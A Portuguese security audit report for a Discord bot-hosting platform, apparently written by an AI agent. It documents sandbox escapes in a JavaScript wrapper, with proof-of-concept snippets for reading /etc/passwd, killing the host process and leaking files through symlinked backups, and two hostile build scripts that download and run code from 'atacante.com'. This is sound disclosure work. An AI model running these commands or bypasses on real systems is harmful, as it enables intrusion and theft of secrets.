# SECURITY_AUDIT.md — Atlantic Host

Auditoria completa do repositório, focada em execução de código não confiável
de clientes sem depender de Docker. Todas as descobertas marcadas
**[CONFIRMADO AO VIVO]** foram reproduzidas de verdade nesta sessão (não são
teóricas) — comandos e resultado estão citados. As demais foram confirmadas
por leitura de código (marcadas **[ANÁLISE DE CÓDIGO]**), com raciocínio
explícito de por que são exploráveis.

Esta é a Fase 1 da missão pedida. Nenhuma correção foi aplicada ainda —
por instrução explícita, o objetivo deste documento é só listar, classificar
e explicar, não consertar.

---

## Resumo executivo

O mecanismo de isolamento hoje (`security_wrapper.js`, usado quando
`USE_CONTAINERS=false`, que é o caso do ambiente atual em Windows) é um
**wrapper JavaScript rodando no mesmo processo do bot hospedado**. A auditoria
confirma, com reprodução ao vivo, que ele:

1. **Não impede leitura/escrita arbitrária no host** (`fs.openSync` não é
   interceptado).
2. **Não impede que um bot mate o processo principal do Atlantic Host**
   (`process.kill` não é interceptado, e `process.ppid` é trivialmente
   obtível).
3. **Não aplica nenhuma política de rede** (acesso irrestrito a
   `net`/`http`/`https`/`dgram`/`dns`).
4. Estruturalmente, **não pode proteger contra um pacote npm de terceiro**
   que o próprio bot declare como dependência — nada impede
   `require('pacote-com-addon-nativo')` de executar código nativo arbitrário,
   completamente fora do alcance de qualquer wrapper em JavaScript.

Além disso, uma mudança feita **nesta mesma sessão** (adicionar
`npm run build` / `prisma generate` automáticos no `dependencyManager.js`,
pra resolver um problema real de deploy de bots TypeScript) reabriu execução
de código arbitrário do cliente diretamente no host, sem NENHUM wrapper —
documentado abaixo como acha do #4, marcado como regressão auto-introduzida.

**Veredito da Fase 1: o sistema, hoje, NÃO tem uma fronteira de segurança
real contra um bot malicioso decidido.** Isso confirma exatamente a premissa
do pedido original — o `security_wrapper.js` já se descreve honestamente como
"não é um sandbox de verdade" no próprio código, e esta auditoria mostra que
a lacuna é ainda maior do que esse comentário sugere (os vetores achados não
são sofisticados — são APIs padrão do Node, não truques de baixo nível).

---

## CRITICAL

### C1 — `fs.openSync`/`fs.open` (e vários outros métodos de `fs`) não são interceptados — leitura e escrita arbitrária no host

- **Arquivo:** `src/utils/security_wrapper.js`, função `wrapFsModule` (linhas 100–146)
- **Severidade:** CRITICAL
- **Status:** **[CONFIRMADO AO VIVO]**

**Cenário de ataque:** o wrapper só substitui uma lista fixa de métodos:
`readFileSync/writeFileSync/appendFileSync/unlinkSync/rmSync/rmdirSync/renameSync/mkdirSync/copyFileSync/createReadStream/createWriteStream`
(e as versões async/promises equivalentes). `fs.open`, `fs.openSync`,
`fs.read`/`fs.readSync`, `fs.write`/`fs.writeSync`, `fs.symlinkSync`,
`fs.linkSync`, `fs.readdirSync`, `fs.statSync`/`fs.lstatSync`,
`fs.accessSync`, `fs.chmodSync`/`fs.chownSync`, `fs.truncateSync`,
`fs.cpSync`, `fs.realpathSync`, `fs.watch` **não estão na lista** — passam
direto pro `fs` original, sem NENHUMA checagem de `assertInsideBotDir`.

Reprodução real (bot hospedado, script rodado com
`node --require security_wrapper.js`):

```js
const fs = require('fs');
const fd = fs.openSync('/etc/passwd', 'r');
const buf = Buffer.alloc(200);
fs.readSync(fd, buf, 0, 200, 0);
console.log(buf.toString()); // leu o arquivo inteiro
```

Resultado real obtido:
```
VULNERAVEL:openSync bypass leu 200 bytes: root:x:0:0:root:/root:/bin/bash
```

E escrita:
```js
const fd = fs.openSync('/tmp/qualquer-arquivo-do-host.txt', 'w');
fs.writeSync(fd, 'conteudo controlado pelo atacante');
```
Resultado real: arquivo escrito com sucesso fora da pasta do bot.

**Impacto:** qualquer bot hospedado (mesmo o mais simples, sem sofisticação
alguma) pode ler o `.env` real da plataforma (`BOT_TOKEN`, `ENCRYPTION_KEY`),
o banco `hosting.db`, os arquivos de outros bots, ou qualquer arquivo que o
usuário do SO que roda o Atlantic Host consiga ler — e escrever/corromper
qualquer arquivo que consiga escrever. Isso anula completamente a separação
de variáveis de ambiente feita em `processManager.js` (que é bem feita, mas
fica irrelevante se o bot pode simplesmente ler o `.env` do disco).

**Exploitabilidade:** trivial. Não exige conhecimento avançado — `fs.openSync`
é uma API padrão, documentada, de primeira página da documentação do Node.

**Correção já existe parcialmente?** Não. A lista de métodos interceptados
precisa ser trocada de "lista de métodos perigosos conhecidos" (allowlist
incompleta por natureza) para uma abordagem que não dependa de enumerar
todo método de I/O que o Node expõe (ver recomendação abaixo).

**Correção recomendada:** isto NÃO deve ser corrigido "adicionando mais
métodos à lista" — é a mesma categoria de erro que já causou o problema
(qualquer API nova do Node, ou uma esquecida, reabre o buraco). A correção
estrutural correta é mover o isolamento de filesystem pra fora do processo
JS (namespace de mount / chroot / container), não tentar interceptar 100%
da superfície de `fs` em JavaScript puro. Ver `THREAT_MODEL.md` e a proposta
de arquitetura de sandbox.

---

### C2 — `process.kill` não é interceptado — um bot pode matar o processo principal (e todos os outros bots) com uma linha

- **Arquivo:** `src/utils/security_wrapper.js` (ausente — deveria estar perto da linha 164, junto com o override de `process.fork`)
- **Severidade:** CRITICAL
- **Status:** **[CONFIRMADO AO VIVO — mecanismo comprovado, não executado até o fim de propósito para não derrubar a sessão de auditoria]**

**Cenário de ataque:** todo processo filho no Node tem acesso a
`process.ppid` (PID do processo pai — o próprio Atlantic Host, já que
`processManager.js` usa `spawn()` direto, sem nenhum usuário/namespace
diferente). `process.kill(pid, signal)` é uma função global do Node, não
interceptada em lugar nenhum:

```js
console.log(process.ppid); // PID do Atlantic Host, trivialmente disponível
process.kill(process.ppid, 'SIGKILL'); // mataria a plataforma inteira
```

Resultado real confirmado (sem executar o kill de verdade, pra não derrubar
a própria sessão de teste):
```
meu PID: 1742 | PID do pai (host): 1739
process.kill existe e nao esta bloqueado: function
```

**Impacto:** um único bot malicioso (ou só mal comportado — nem precisa ser
intencional) derruba o processo principal do Atlantic Host inteiro,
incluindo TODOS os outros bots hospedados, o bot Discord de gestão, tudo —
com uma única chamada de API padrão. Isto é um DoS trivial de plataforma
inteira a partir de um único tenant.

**Exploitabilidade:** trivial.

**Correção já existe parcialmente?** Só o `process.fork` é sobrescrito
(linha 164). `process.kill` nunca foi tocado.

**Correção recomendada:** interceptar `process.kill` e restringir a
sinais/PIDs que afetem só o próprio processo (`pid === process.pid`), OU
(melhor, estrutural) rodar o bot num PID namespace próprio, onde ele
literalmente não enxerga o PID do host (isso é o que namespaces de PID
resolvem de verdade — ver arquitetura de sandbox Linux).

---

### C3 — Nenhuma política de rede: acesso irrestrito a `net`/`http`/`https`/`dgram`/`dns`

- **Arquivo:** `src/utils/security_wrapper.js` (política de rede inexistente)
- **Severidade:** CRITICAL
- **Status:** **[CONFIRMADO AO VIVO]**

**Cenário de ataque:**
```js
const net = require('net');
net.connect(...); // sem bloqueio nenhum
```
Resultado real: `net module carregado sem bloqueio: function`.

Isso significa que um bot hospedado pode, sem nenhuma restrição:
- Escanear a rede local (outros hosts na mesma LAN/VPC).
- Acessar `localhost` em qualquer porta — incluindo portas internas do
  próprio Atlantic Host (webhook do GitHub, proxy, health endpoint,
  eventual endpoint de metadados de nuvem se rodar em cloud) e de outros
  bots (se algum expuser uma porta local).
- Fazer requisições **SSRF** pra qualquer endereço, incluindo
  `169.254.169.254` (endpoint de metadados de instância em AWS/GCP/Azure —
  se a plataforma um dia rodar em cloud, isso rouba credenciais de IAM da
  própria VM).
- Se comunicar livremente com qualquer bot de outro cliente que esteja
  escutando em alguma porta local.

**Impacto:** quebra completa de isolamento de rede entre tenants, SSRF
contra a infraestrutura interna e (potencialmente) contra serviços de nuvem.

**Exploitabilidade:** trivial — não precisa nem de código malicioso
sofisticado, é o comportamento padrão de qualquer bot Discord.js normal.

**Correção já existe parcialmente?** Não, nenhuma.

**Correção recomendada:** política de rede real precisa ser aplicada no
nível de SO (network namespace + regras de firewall no lado do host), não
em JavaScript — um wrapper JS não consegue interceptar chamadas de socket de
baixo nível de forma confiável (e certamente não impede um pacote nativo).

---

### C4 — `npm run build` / `prisma generate` executam comando controlado pelo cliente direto no host, sem NENHUM isolamento (regressão introduzida nesta sessão)

- **Arquivo:** `src/managers/dependencyManager.js`, linhas 125–145
- **Severidade:** CRITICAL
- **Status:** **[ANÁLISE DE CÓDIGO — mecanismo trivialmente exploitável, não precisa de reprodução pra confirmar]**

**Contexto:** numa sessão anterior desta mesma conversa, adicionei essas duas
chamadas pra resolver um problema real (bots TypeScript/Prisma não
compilavam). O raciocínio documentado no código ("é o schema/script do
próprio bot, não de um pacote de terceiro, então não é afetado pelo
--ignore-scripts") está **correto sobre por que não é bloqueado pelo
--ignore-scripts, mas errado sobre segurança**: um script `"build"` no
`package.json` do cliente pode ser **literalmente qualquer comando de
shell**, e é executado via `exec()` (um shell de verdade), sem passar pelo
`security_wrapper.js` (que só é injetado depois, na hora de RODAR o bot via
`spawn()` — não durante build/install).

**Cenário de ataque:** um `package.json` malicioso:
```json
{ "scripts": { "build": "curl http://atacante.com/x.sh | sh" } }
```
ou no Windows:
```json
{ "scripts": { "build": "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://atacante.com/x.ps1')" } }
```
É executado com `exec(command, { cwd: folderPath, env: installEnv, ... })` —
`env` é restrito (não vaza segredos, isso está correto), mas **não há
nenhuma restrição de filesystem, rede ou processo**. É simplesmente rodar o
comando do atacante no shell do host.

**Impacto:** execução de código arbitrário completa no host, como o mesmo
usuário do SO que roda o Atlantic Host inteiro — sem precisar de nenhum
bypass, é o comportamento pretendido da funcionalidade que adicionei.

**Exploitabilidade:** trivial — só precisa hospedar um bot com esse
`package.json`.

**Correção já existe parcialmente?** Não. Esta é uma regressão nova, não um
problema herdado. Precisa ser revertida ou isolada antes de qualquer outra
coisa.

**Correção recomendada:** ou (a) remover a execução automática de
`build`/`prisma generate` e documentar que bots TypeScript precisam ser
compilados fora da plataforma (voltando ao problema original), ou
(b) — melhor — rodar TODO o processo de install/build dentro do mesmo
mecanismo de sandbox real que vai rodar o bot (ver Fase 8 do pedido original:
"o processo de build/deploy também deve ocorrer isolado"). Não faz sentido
proteger a EXECUÇÃO do bot e deixar o BUILD dele livre — é a mesma classe de
código não confiável.

---

### C5 — Backup de bot (`addLocalFolder`) segue links simbólicos plantados pelo próprio bot — exfiltra arquivos do host via a funcionalidade normal de "Backup"

- **Arquivos:** `src/managers/backupManager.js` linha 59 (`zip.addLocalFolder(sourcePath)`); raiz do problema em `node_modules/adm-zip/util/utils.js` (`findFiles`/`findFilesAsync`, que usa `fs.statSync` — que SEGUE symlink — pra decidir se desce num diretório)
- **Severidade:** CRITICAL
- **Status:** **[CONFIRMADO AO VIVO]**

**Cenário de ataque:** nada no `security_wrapper.js` impede um bot de chamar
`fs.symlinkSync(alvo, nomeDentroDaPastaDoBot)` (não está na lista de métodos
interceptados — mesma raiz do achado C1). Um bot planta:
```js
fs.symlinkSync('/qualquer/caminho/legivel/pelo/host', 'pasta_inocente');
```
e depois só precisa pedir um **Backup normal** (funcionalidade legítima,
via comando Discord). `AdmZip.addLocalFolder()` caminha o diretório usando
`fs.statSync` (que segue symlink) pra decidir se desce recursivamente — e
INCLUI o conteúdo do alvo do link dentro do zip do backup.

Reprodução real:
```bash
ln -s /caminho/com/segredo botdir/leak_secret
# depois, comando "Backup" no bot:
```
```
entradas no zip: [ 'index.js', 'leak_secret/', 'leak_secret/.env' ]
VULNERAVEL: conteudo vazado no backup do bot: SEGREDO_DA_PLATAFORMA=nao-pode-vazar-no-backup
```

Testei também apontando o symlink pra `/etc` real — o processo tentou
recursivamente ler `/etc` inteiro (chegou a dar erro de arquivo secundário
sumindo no meio do caminho por uma outra condição de corrida do próprio
`adm-zip`, mas isso só reforça: ele estava mesmo descendo por `/etc` afora).

**Impacto:** um cliente comum, sem nenhum acesso privilegiado, consegue
exfiltrar qualquer arquivo legível pelo processo do Atlantic Host —
incluindo o `.env` real da plataforma (se o processo tiver permissão de
leitura nele, o que é o caso normal já que tudo roda como o mesmo usuário) —
usando só a função de Backup, que é uma feature legítima e visível no menu
do bot. Não precisa de nenhum conhecimento de bypass, só saber criar um
symlink.

**Exploitabilidade:** trivial, e usa uma feature que já existe e é usada por
clientes legítimos o tempo todo — ou seja, pode já ter sido usada sem
ninguém perceber.

**Correção já existe parcialmente?** Não — o zip-slip e zip-bomb JÁ são
tratados em `validateZipEntries` (`src/utils/zipValidation.js`), mas isso só
é chamado na hora de **restaurar** um backup (extração), nunca na hora de
**criar** um (que é o caminho vulnerável aqui).

**Correção recomendada:** antes de chamar `addLocalFolder`, caminhar a
árvore com `fs.lstatSync` (NÃO segue symlink) e recusar/pular qualquer
entrada cujo `lstat` reporte `isSymbolicLink()`. Combinado com bloquear
`fs.symlinkSync`/`fs.linkSync` no `security_wrapper.js` (que hoje também não
intercepta esses métodos — mesma raiz do C1).

---

### C6 — Falha estrutural: um deny-list de nomes de módulo não pode proteger contra pacotes npm de terceiros, incluindo addons nativos

- **Arquivo:** `src/utils/security_wrapper.js`, `Module.prototype.require` (linhas 148–161)
- **Severidade:** CRITICAL (estrutural — explica por que C1/C2/C3 existem e por que não dá pra simplesmente "adicionar mais itens na lista")
- **Status:** **[ANÁLISE DE CÓDIGO — classe de vulnerabilidade bem documentada na literatura de segurança Node.js, não é especulação]**

**Cenário de ataque:** `BANNED_MODULES` bloqueia só
`child_process/cluster/v8/vm/inspector/repl` pelo NOME. Isso não impede:
- Um `package.json` do bot declarar uma dependência npm (instalada
  livremente, já que `--ignore-scripts` só bloqueia scripts de instalação,
  não o pacote em si) que contenha um addon nativo pré-compilado
  (arquivo `.node`) — código de máquina nativo, que roda direto na CPU sem
  passar por absolutamente nenhuma checagem de `require()` do Node, porque
  o `.node` já é só um binário carregado via `process.dlopen`, sem ter que
  "requerer" nenhum dos módulos da lista proibida pra fazer qualquer coisa
  que `child_process` faria (abrir arquivo, abrir socket, rodar
  syscall arbitrária).
- Qualquer nome de pacote npm não previsto na lista (a lista é uma
  enumeração de módulos NATIVOS do Node, não tem nem como cobrir os
  ~3 milhões de pacotes do npm).

**Impacto:** o modelo de segurança inteiro do `security_wrapper.js` assume
que "código perigoso" é sinônimo de "um dos 6 módulos nativos da lista".
Isso é falso — qualquer dependência de terceiro pode conter código nativo
ou usar truques (ex: `Buffer` + FFI-like tricks, ou simplesmente reescrever
`Module.prototype.require` de volta antes do wrapper mesmo terminar de
configurar tudo, dependendo da ordem de carregamento) que tornam esse
wrapper contornável por definição.

**Correção já existe parcialmente?** Não, e não pode existir — isso não é
um bug pontual pra corrigir, é uma limitação arquitetural do modelo
"proteção em JS no mesmo processo". Confirma exatamente a premissa do
pedido original.

**Correção recomendada:** não tem correção dentro do próprio wrapper. A
única correção real é isolamento no nível de SO (processo com privilégios
reduzidos rodando em namespace próprio, sem acesso ao filesystem do host,
sem capacidade de abrir socket fora de uma allowlist, etc.) — exatamente o
que as Fases 3–7 do pedido original pedem.

---

## HIGH

### H1 — TOCTOU em `assertInsideBotDir`

- **Arquivo:** `src/utils/security_wrapper.js` linhas 72–98; mesmo padrão em `src/managers/fileManager.js` (`safeResolve`)
- **Severidade:** HIGH (mas hoje "eclipsada" pelos CRITICALs acima — mesmo que isso fosse perfeito, C1 já contorna tudo)
- **Status:** **[ANÁLISE DE CÓDIGO]**

Existe uma janela entre `assertInsideBotDir()` resolver o caminho real
(seguindo o link simbólico que existir NAQUELE instante) e o método `fs`
de fato operar sobre o caminho. Se o bot conseguir trocar um symlink nessa
janela (ex: uma segunda thread/worker apontando o link pra outro lugar
logo depois da checagem passar), a checagem valida um alvo e a operação
real acontece sobre outro. Clássico TOCTOU de symlink.

**Correção recomendada:** usar `O_NOFOLLOW` na abertura (rejeita se o
componente final for um symlink) combinado com abrir por descritor de
diretório (`openat`-style) em vez de resolver o caminho como string e depois
reabrir — isso não é trivialmente exposto pela API padrão de `fs` do Node,
outro motivo pra isolar via SO em vez de JS.

---

### H2 — Segredo do webhook do GitHub é único e global (cross-tenant)

- **Arquivo:** `src/managers/githubManager.js` (documentado no próprio código, linhas 191–198)
- **Severidade:** HIGH
- **Status:** já documentado como limitação conhecida em sessão anterior; **ainda não corrigido**

Um único `GITHUB_WEBHOOK_SECRET` vale pra todos os bots. Um cliente com
deploy via GitHub configurado sabe o segredo (é o mesmo `.env`) e pode, em
tese, forjar um payload de webhook válido pra QUALQUER outro bot cujo
`github_repo` ele descubra (se for público), disparando `git pull` +
restart nele.

**Correção recomendada:** segredo de webhook por bot (nova coluna +
fluxo de configuração).

---

### H3 — Corrida em `startBot()`: duplo start antes do processo ser registrado

- **Arquivo:** `src/managers/processManager.js`, linhas 322–399
- **Severidade:** HIGH
- **Status:** **[ANÁLISE DE CÓDIGO]**

A checagem `if (bot.status === 'online' && activeProcesses.has(botId))`
(linha 326) acontece, depois vêm vários `await` (checagem de RAM do host,
possível chamada a Docker) antes de `activeProcesses.set(botId, ...)`
(linha 399+). Duas chamadas concorrentes a `startBot(mesmoBotId)` (ex: dois
cliques rápidos, ou duas interações Discord quase simultâneas) passam as
duas pela checagem antes de qualquer uma registrar o processo — resultado:
dois processos do mesmo bot rodando ao mesmo tempo (mesmo token Discord —
o Discord provavelmente desconecta um dos dois, mas o processo órfão fica
consumindo RAM/CPU sem controle do painel).

**Correção recomendada:** lock por `botId` (ex: um `Set` de "iniciando
agora", checado e setado de forma síncrona ANTES do primeiro `await`).

---

## MEDIUM

### M1 — `fs.symlinkSync`/`fs.linkSync` não são interceptados

- **Arquivo:** `src/utils/security_wrapper.js`
- **Severidade:** MEDIUM (raiz do C5, listado separado por clareza)
- Um bot pode criar link simbólico ou hardlink pra qualquer caminho sem
  nenhuma checagem. É a causa raiz do C5. Mesmo corrigindo C5 no
  `backupManager.js`, isso continua sendo uma lacuna genérica (ex: um
  hardlink pra um arquivo do host, se estiver no mesmo filesystem, permite
  que uma operação de escrita sobre o "arquivo do bot" na verdade corrompa
  o arquivo real do host via contagem de referência compartilhada).

### M2 — Sem limite real de CPU sem Docker

- **Arquivo:** `src/managers/processManager.js` (uso de `cpulimit`/`nice` como wrappers opcionais)
- **Severidade:** MEDIUM
- Se `cpulimit` não estiver instalado no host (comum em Windows — não
  existe `cpulimit` nativo lá), não há NENHUM limite de CPU aplicado. Um bot
  pode consumir 100% de um núcleo indefinidamente. Isso não afeta outros
  bots diretamente (cada um é seu próprio processo do SO), mas degrada a
  máquina inteira (incluindo o próprio Atlantic Host) se vários bots
  fizerem isso ao mesmo tempo.

### M3 — Watchdog de RAM é por polling (soft), não por cgroup (hard)

- **Arquivo:** `src/managers/monitorManager.js` / `processManager.js`
- **Severidade:** MEDIUM
- O limite de RAM por bot é verificado periodicamente (a cada N segundos) e
  reage matando o processo DEPOIS de ultrapassar o limite — não existe um
  teto rígido de kernel (cgroup) que recuse alocação além do limite na hora.
  Entre duas checagens, um bot pode espicaçar a RAM do host inteiro por
  alguns segundos antes de ser derrubado.

---

## LOW / INFO

### L1 — `os` module sem restrição (informação do host)

`os.hostname()`, `os.networkInterfaces()`, `os.cpus()`, `os.totalmem()`
disponíveis sem bloqueio — vazamento de informação sobre a topologia do
host (baixo impacto isolado, mas ajuda a planejar outros ataques, ex:
`os.networkInterfaces()` revela a faixa de IP interna pra tentar SSRF/scan
depois).

### L2 — Variáveis de ambiente de sistema propagadas no Windows (`SystemRoot`, `WINDIR`, `APPDATA`, `TEMP`)

`src/managers/processManager.js` linhas 366–372 — não são segredos (são
caminhos padrão do Windows), mas revelam o nome de usuário do Windows via
`APPDATA` (`C:\Users\<nome>\AppData\Roaming`) pra qualquer bot que leia
`process.env.APPDATA`. Impacto mínimo (é sabido pelo próprio dono do bot na
maioria dos casos), listado por completude.

---

## Verificado e confirmado SEM vulnerabilidade (não incluir em correções futuras por engano)

Pra não distorcer prioridades, os itens abaixo foram checados
especificamente e estão corretos hoje:

- **SQL injection:** todo o `database.js` e os managers usam parâmetros
  (`?`) — não achei nenhuma concatenação de valor de usuário em SQL. Um caso
  de SQL dinâmico (`orderManager.js:79`, monta `SET campo1=?, campo2=?`) usa
  só nomes de coluna fixos no código, nunca vindos do usuário — seguro.
- **Zip-slip / zip bomb na EXTRAÇÃO:** `src/utils/zipValidation.js` cobre
  `../`, barra invertida (`\`) e limites de tamanho/quantidade de entradas
  antes de qualquer `extractAllTo`. Testado nesta auditoria e na sessão
  anterior.
- **`adm-zip` não recria symlinks na extração:** confirmado lendo o código
  da lib — ela só escreve arquivo/pasta normal, nunca chama
  `fs.symlinkSync` ao extrair. O vetor de symlink-via-zip (diferente do C5,
  que é sobre CRIAR backup, não restaurar) não é explorável hoje.
- **Comandos git/`execFile`:** `src/managers/githubManager.js` usa
  `execFile` com argumentos em array (nunca concatenação de string pra
  shell) — confirmado que `repoUrl`/`branch`/`commitHash` não podem injetar
  comando, mesmo com caracteres como `;`/`` ` ``/`$()`.
- **Separação de variáveis de ambiente do bot vs. da plataforma:**
  `processManager.js` monta o `env` do processo do bot do zero (não herda
  `process.env` inteiro), com uma lista de bloqueio
  (`BOT_TOKEN, ENCRYPTION_KEY, OWNER_ID, CLIENT_ID, ...`) pra impedir que uma
  variável de ambiente configurada pelo dono do bot sobrescreva um segredo
  da plataforma. Bem desenhado — só é anulado na prática pelo C1 (o bot lê
  o `.env` do disco de qualquer jeito).
- **Isolamento de rede entre containers Docker** (quando `USE_CONTAINERS=true`):
  rede dedicada com `enable_icc=false`, sem exposição do socket do Docker,
  `--cap-drop ALL`. Não é o modo ativo hoje (Windows, sem Docker em uso),
  mas está correto para quando for usado.
- **`worker_threads` como via de bypass:** testado ao vivo — o Node propaga
  `execArgv` (incluindo `--require security_wrapper.js`) pra Workers criados
  por padrão, então o wrapper também se aplica dentro de um Worker. Não é
  um bypass viável hoje (mas continua sujeito aos mesmos buracos C1–C3
  DENTRO do worker, já que é o mesmo wrapper).

---

## Tabela-resumo

| ID | Vulnerabilidade | Severidade | Confirmado |
|---|---|---|---|
| C1 | `fs.openSync` e afins não interceptados | CRITICAL | Ao vivo |
| C2 | `process.kill` não interceptado | CRITICAL | Ao vivo (mecanismo) |
| C3 | Sem política de rede | CRITICAL | Ao vivo |
| C4 | `npm run build`/`prisma generate` sem sandbox | CRITICAL | Código (regressão desta sessão) |
| C5 | Backup segue symlink, exfiltra host | CRITICAL | Ao vivo |
| C6 | Deny-list de módulo não cobre pacotes npm/addons nativos | CRITICAL | Código (estrutural) |
| H1 | TOCTOU em `assertInsideBotDir` | HIGH | Código |
| H2 | Segredo de webhook GitHub global | HIGH | Código (conhecido) |
| H3 | Corrida em `startBot()` | HIGH | Código |
| M1 | `fs.symlinkSync`/`linkSync` livres | MEDIUM | Código |
| M2 | Sem limite real de CPU sem Docker | MEDIUM | Código |
| M3 | Watchdog de RAM é soft (polling) | MEDIUM | Código |
| L1 | `os.*` sem restrição | LOW | Código |
| L2 | Env vars de sistema Windows propagadas | INFO | Código |

**Total: 6 CRITICAL, 3 HIGH, 3 MEDIUM, 2 LOW/INFO.**

Nenhuma correção foi aplicada nesta fase. Próximo passo (Fase 2): modelo de
ameaças formal em `THREAT_MODEL.md`.
